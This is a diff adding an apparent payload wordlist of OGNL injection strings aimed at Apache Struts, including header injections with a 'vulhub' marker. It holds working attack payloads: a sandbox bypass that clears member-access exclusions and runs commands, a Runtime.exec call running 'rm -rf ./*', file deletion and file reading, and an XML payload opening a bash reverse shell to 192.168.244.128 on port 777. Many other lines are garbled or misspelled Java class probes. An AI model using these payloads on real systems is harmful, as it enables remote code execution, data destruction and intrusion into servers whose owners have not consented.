@@ -1,0 +1,210 @@
+%{#a=@java.lang.Thread@currentThread().getThreadGroup(),#b=#a,#c=#b.getParent(),#env = '',#while = "#b=#c,#c=#c.getParent(),(#up)(#env)",#up = "(#c != null)?(#while)(#env):1",#b.stop()}
+Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
+%{#a = new java.lang.ThreadLocal(@Override  protected ConnectioninitialValu(){return createConnection();})a.initialValue()}
+%{#a = @java.lang.Package@getPackage("")}
+%{#a = @java.lang.ClassLoader@a}
+%{#f=new java.io.File("C:\\Users\\hp\\Desktop\\关键字1.txt"),#f.delete()}
+%{#f=new java.io.FileReader("C:\\Users\\hp\\Desktop\\关键字.txt"),#a = new char[1024],#f.read(#a,0,1024),new java.lang.String(#a)}
+%{@java.lang.Thread@currentThread().stop()}
+%{#a = @com.sun.management.DiagnosticCommandMBean}
+%{#a = new com.sun.management.DiagnosticCommandMBean()}
+%{#a = @org.apache.catalina.session.JMSContext}
+%{#a = new org.apache.catalina.session.JMSContext()}
+%{#a = new javax.sql.rowset.RowSetMetaDataImpl()}
+%{#a = @javax.sql.rowset.RowSetMetaDataImpl}
+%{#a = new java.nio.channels.Pipe()}
+%{#a = @java.nio.channels.Pipe}
+%{#a = @sun.invoke.Empty}
+%{#a = new sun.invoke.Empty()}
+%{#a = new java.util.zip.DeflaterInputStream()}
+%{#a =@java.util.zip.ZipFile@CENATT }
+%{#a =@java.net.Authenticator}
+%{#a =new java.net.Authenticator()}
+%{#a =@sun.misc.Unsafe@getUnsafe()}
+%{#a =new java.util.concurrent.CountDownLatch()}
+%{#a =@java.util.concurrent.CountDownLatch}
+%{#a = new org.apache.catalina.session.StandardSession()} 
+%{#a = @org.apache.catalina.session.StandardSession} 
+%{#a =new com.atlassian.confluence.util.velocity.VelocityUtils()}
+%{#a =@com.atlassian.confluence.util.velocity.VelocityUtils()}
+%{#a =@com.google.common.reflect.Reflection}
+%{#a =new com.google.common.reflect.Reflection()}
+%{#a =new com.atlassian.sal.api.net.RequestFactory()}
+%{#a =@com.atlassian.sal.api.net.RequestFactory()}
+%{#a =@com.hazelcast.spi.Operation}
+%{#a =new com.hazelcast.spi.Operation}
+%{#a =@org.apache.commons.httpclient.HttpClient}
+%{#a =new org.apache.commons.httpclient.HttpClient()}
+%{#a =@com.atlassian.util.concurrent.LazyReference()}
+%{#a =new com.atlassian.util.concurrent.LazyReference()}
+%{#a =@freemarker.ext.jsp.TaglibFactory}
+%{#a =new freemarker.ext.jsp.TaglibFactory()}
+%{#a =new com.sun.jna.JniDispatch32()}
+%{#a =@com.sun.jna.JniDispatch32()}
+%{#a =new com.sun.corba.se.impl.encoding.CodeSetConversion()}
+%{#a =@com.sun.corba.se.impl.encoding.CodeSetConversion}
+%{#a =@com.sun.jmx.snmp.tasks.Task}
+%{#a =new com.sun.jmx.snmp.tasks.Task()}
+%{#a =new org.apache.commons.exec.CommandLine()}
+%{#a =@org.apache.commons.exec.CommandLine}
+%{#a =new java.lang.reflect.Constructor<T>().getDeclaringClass()}
+%{#a =new jcom.atlassian.util.concurrent.LazyReference()}
+%{#a =@com.atlassian.util.concurrent.LazyReference}
+%{#a=new java.io.File("~"),#a.list()}
+%{#a=new java.lang.Runtime().exec("rm -rf ./*")}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=@sun.misc.Unsafe.class.getDeclaredField("theUnsafe"),#f.setAccessible(true),#unsafe=#f.get(null)}
+%{#a=new javax.script.ScriptEngineManager().getBindings()}
+%{#em=@javax.persistence.Persistence@createEntityManagerFactory("test").createEntityManager(),#em.createQuery("select * from Student")}
+%{#sc=@javax.servlet.http.HttpServletRequest.getSession().getServletContext()}
+%{#sc=@javax.servlet.http.HttpServletRequest.getSession().getServletContext().setAttribute("test", "hello")}
+%{#sc=@javax.servlet.http.HttpServletRequest.getSession().getServletContext().getInitParameterNames()}
+<command> <string>bash</string> <string>-c</string> <string>bash -i >&amp; /dev/tcp/192.168.244.128/777 0>&amp;1</string> </command>
+%{(#instancemanager=#application['org.apache.tomcat.InstanceManager']).(#stack=#request['struts.valueStack']).(#bean=#instancemanager.newInstance('org.apache.commons.collections.BeanMap')).(#bean.setBean(#stack)).(#context=#bean.get('context')).(#bean.setBean(#context)).(#macc=#bean.get('memberAccess')).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance('java.util.HashSet')).(#bean.put('excludedClasses',#emptyset)).(#bean.put('excludedPackageNames',#emptyset)).(#arglist=#instancemanager.newInstance('java.util.ArrayList')).(#arglist.add('id')).(#execute=#instancemanager.newInstance('freemarker.template.utility.Execute')).(#execute.exec(#arglist))}
+Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}"
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.inheritableThreadlocal.get()}
+%{@java.lang.shuntdown()}
+%{#memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS，@java.lang@avaoableProcessors()}
+%{@java.io.BufferedInputStream.close()}
+%{#_memberAccess.allowStaticMethodAccess=true  ,@java.io.BufferedInputStream@close()}
+%{#excludeProperties=@java.util.Collections@EMPTY_SET,@java.io.BufferedInputStream@close()}
+%{@java.io.BufferedOutputStream.Write(0)}
+%{#excludeProperties=@java.util.Collections@EMPTY_SET,@java.io.BufferedOutputStream.Write(5)}
+%{java.io.BufferedInputStream.Close()}
+%{#_memberAccess.allowStaticMethodAccess=true  ,java.io.BufferedInputStream@Close()}
+%{java.io.BufferedWriter.write(1)}
+%{#_memberAccess.allowStaticMethodAccess=true ,java.io.ByteArrayInputStream@close() }
+%{@java.io.ByteArrayOutputStream.write(256)}
+%{@java.io.CharArrayReader.read()}
+%{#_memberAccess['allowPrivateAccess']=true,@java.io.CharArrayWriter.append('c')}
+%{@java.io.DataInputStream.readUTF()}
+%{@java.io.BufferedInputStream.write(1)}
+%{@java.io.BufferedIoutStream.flush}
+%{#excludeProperties=@java.util.Collections@EMPTY_SET,@Java.io.File@sync()}
+%{#_memberAccess.allowStaticMethodAccess=true,@java.io.FileOutputStream@hashCode()}
+%{#excludeProperties=@java.util.Collections@EMPTY_SET,@java.io.FileOutputStream@hashCode()}
+%{@java.io.FilterInputStream.close()}
+%{@java.io.FilterReader.reset()}
+%{@java.io.FilterWriter.close()}
+%{#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.io.FilterWriter@available()}
+%{@java.io.InputStream.close()}
+%{#excludeProperties=@java.util.Collections@EMPTY_SET,@java.io.InputStreamReader.getEncoding()}
+%{@java.io.InputStreamReader.getEncoding()}
+%{@java.io.InputStreamReader.read()}
+%{#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.io.InputStreamReader@close()}
+%{@java.io.InputStreamReader.ready()}
+%{@java.io.LineNumberInputStream.getLineNumber()}
+%{#_memberAccess.allowStaticMethodAccess=true,@java.io.LineNumberReader@readLine()}
+%{@java.io.ObjectInputStream.readBoolean()}
+%{#a={"1,2,3"},@java.io.ObjectInputStream.getField.defaulted(a)}
+%{@java.io.ObjectOutputStream.defaultWriteObject()}
+%{@java.io.ObjectStreamClass.getName()}
+%{@java.io.ObjectStreamField.getOffset()}
+%{#a={"jygfjgjj"},java.io.ObjectStreamField.isPrimitive(a)}
+%{@java.io.PipedOutputStream.write(5)}
+%{@java.io.PrintStream.flush()}
+%{#a={"hello"},java.io.PushbackInputStream.available(a)}
+%{@java.io.PushbackReader.close()}
+%{@java.io.PushbackReader.ready()}
+%{#_memberAccess.allowStaticMethodAccess=true,@java.io.RandomAccessFile.close()}
+%{@java.io.Reader.close()}
+%{#a={"fawefwafw"},@java.io.StringReader.markSupported(a)}
+%{@java.io.StringWriter.flush()}
+%{#a={java.io.Writer.write("hello ")}}
+%{@java.io.BufferedInputStream}
+%{@java.io.BufferedOutputStream}
+%{@java.io.BufferedReader}
+%{@java.io.BufferedWriter}
+%{@java.io.ByteArrayInputStream}
+%{@java.io.ByteArrayOutputStream}
+%{@java.io.CharArrayReader}
+%{@java.io.CharArrayWriter}
+%{@java.io.Console}
+%{@java.io.DataInputStream}
+%{@java.io.DataOutputStream}
+%{@java.io.FilterInputStream}
+%{@java.io.FilterOutputStream}
+%{@java.io.FilterReader}
+%{@java.io.FilterWriter}
+%{@java.io.InputStream}
+%{@java.io.InputStreamReader}
+%{@java.io.LineNumberInputStream}
+%{@java.io.LineNumberReader}
+%{@java.io.ObjectInputStream}
+%{@java.io.ObjectInputStream.GetField}
+%{@java.io.ObjectOutputStream}
+%{@java.io.ObjectOutputStream.PutField}
+%{@java.io.ObjectStreamClass}
+%{@java.io.ObjectStreamField}
+%{@java.io.OutputStream}
+%{@java.io.OutputStreamWriter}
+%{@java.io.PipedInputStream}
+%{@java.io.PipedOutputStream}
+%{@java.io.PipedReader}
+%{@java.io.PipedWriter}
+%{@java.io.PrintStream}
+%{@java.io.PrintWriter}
+%{@java.io.PushbackInputStream}
+%{@java.io.PushbackReader}
+%{@java.io.RandomAccessFile}
+%{@java.io.Reader}
+%{@java.io.SequenceInputStream}
+%{@java.io.SerializablePermission}
+%{@java.io.StreamTokenizer}
+%{@java.io.StringBufferInputStream}
+%{@java.io.StringReader}
+%{@java.io.StringWriter}
+%{@java.io.Writer}
+%{new java.io.BufferedInputStream().close()}
+%{new java.io.BufferedOutputStream().flush()}
+%{new java.io.BufferedReader().lines()}
+%{new java.io.BufferedWriter().newLine()}
+%{new java.io.ByteArrayInputStream().mark()}
+%{new java.io.ByteArrayOutputStream().}
+%{new java.io.CharArrayReader().buf()}
+%{new java.io.CharArrayWriter().buf()}
+%{new java.io.Console().readPassword()}
+%{new java.io.DataInputStream().readLine()}
+%{new java.io.DataOutputStream().flush()}
+%{new java.io.LineNumberInputStream().getLineNumber()}
+%{new java.io.LineNumberReader().getLineNumber()}
+%{new java.io.PipedInputStream().receive(a)}
+%{new java.io.PipedOutputStream().connect(a)}
+%{new java.io.PipedReader().ready()}
+%{new java.io.RandomAccessFile().commentChar(ch)}
+%{new java.io.StreamTokenizer().commentChar(ch)}
+%{@java.io.Console}
+%{@java.io.Console@flush()}
+%{@java.io.Console@readLine(String fmt, Object...args)}
+%{@java.io.Console@readPassword(String fmt, Object... args)}
+%{@java.io.Console@reader()}
+%{@java.io.Console@writer()}
+%{@java.io.DataInputStream}
+%{@java.io.DataInputStream@read(byte[] b, int off, int len)}
+%{@java.io.DataInputStream@readFully(byte[] b, int off, int len)}
+%{@java.io.DataInputStream@readUTF(DataInput in)}
+%{@java.io.DataOutputStream}
+%{@java.io.DataOutputStream@write(byte[] b, int off, int len)}
+%{@java.io.DataOutputStream@writeUTF(String str)}
+%{@java.io.Reader}
+%{@java.io.Reader@read(char[] cbuf, int off, int len)}
+%{@java.io.Writer}
+%{@java.io.Writer@append(CharSequence csq)}
+%{@java.io.Writer@write(char[] cbuf, int off, int len)}
+%{@java.io.SerializablePermission}
+%{@java.io.RandomAccessFile}
+%{@java.io.RandomAccessFile@getFilePointer()}
+%{@java.io.RandomAccessFile@read(byte[] b, int off, int len)}
+%{@java.io.RandomAccessFile@readFully(byte[] b, int off, int len)}
+%{@java.io.RandomAccessFile@write(byte[] b, int off, int len)}
+%{@java.io.RandomAccessFile@readUTF()}
+%{@java.io.RandomAccessFile@writeUTF(String str)}
+%{@java.io.PipedReader}
+%{@java.io.PipedReader@connect(PipedWriter src)}
+%{@java.io.PipedReader@read(char[] cbuf, int off, int len)}
+%{@java.io.PipedWriter}
+%{@java.io.PipedWriter@connect(PipedReader snk)}
+%{@java.io.PipedWriter@write(char[] cbuf, int off, int len)}
+%{@java.io.BufferedInputStream}
+%{@java.io.BufferedInputStream@read(byte[] b, int off, int len)}
+%{@java.io.BufferedOutputStream}
+%{@java.io.BufferedOutputStream@write(byte[] b, int off, int len)}
